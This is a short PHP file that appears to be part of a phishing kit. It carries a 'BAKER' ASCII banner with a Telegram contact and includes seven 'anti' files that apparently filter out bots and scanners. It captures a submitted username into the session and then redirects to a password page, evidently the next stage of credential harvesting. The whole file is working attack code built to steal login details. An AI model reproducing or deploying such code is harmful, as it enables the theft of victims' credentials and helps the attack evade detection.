<?php

/*

██████╗  █████╗ ██╗  ██╗███████╗██████╗ 
██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
██████╔╝███████║█████╔╝ █████╗  ██████╔╝
██╔══██╗██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝██║  ██║██║  ██╗███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ https://t.me/BAK34_TMW
                                                                                              
*/
session_start();

include "../anti/anti1.php";
include "../anti/anti2.php";
include "../anti/anti3.php";
include "../anti/anti4.php";
include "../anti/anti5.php";
include "../anti/anti6.php";
include "../anti/anti7.php";



include '../bak3r.php';

$_SESSION['username'] = $_POST['username'];


header("Location: ../pass.php");